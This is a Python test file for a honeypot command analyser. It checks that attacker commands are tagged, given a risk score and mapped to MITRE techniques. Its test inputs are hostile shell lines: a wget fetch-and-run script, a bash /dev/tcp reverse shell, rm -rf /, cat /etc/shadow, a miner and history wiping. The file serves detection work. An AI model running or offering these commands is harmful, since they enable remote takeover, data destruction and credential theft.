from honeypot.analysis import TAG_TECHNIQUES, analyze_command


def test_download_is_flagged_and_url_extracted():
    a = analyze_command("cd /tmp; wget http://198.51.100.7/x.sh; chmod +x x.sh; ./x.sh")
    assert "download" in a.tags and "make-executable" in a.tags
    assert a.urls == ("http://198.51.100.7/x.sh",)
    assert a.ips == ()  # an IP inside a URL is not double counted
    assert a.risk >= 14


def test_download_with_absolute_path_and_busybox():
    assert "download" in analyze_command("/usr/bin/wget http://x.example/a").tags
    assert "download" in analyze_command("/bin/busybox wget http://x.example/a").tags


def test_reverse_shell_detected_and_ip_extracted():
    a = analyze_command("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")
    assert "reverse-shell" in a.tags
    assert a.ips == ("192.0.2.1",)


def test_recon_is_low_risk_and_anchored():
    assert analyze_command("uname -a").risk == 1
    # "id" inside an option must not count as the `id` command
    assert "recon" not in analyze_command("useradd --user-id 0 x").tags


def test_loopback_ips_are_ignored():
    assert analyze_command("ping 127.0.0.1").ips == ()


def test_risk_is_capped():
    nasty = (
        "wget http://a.example/x; chmod 777 x; bash -i >& /dev/tcp/192.0.2.9/1 0>&1; "
        "xmrig; rm -rf /; crontab -l; useradd x; history -c; cat /etc/shadow"
    )
    assert analyze_command(nasty).risk == 50


def test_every_tag_has_a_mitre_technique():
    assert all(t.startswith("T1") for t in TAG_TECHNIQUES.values())
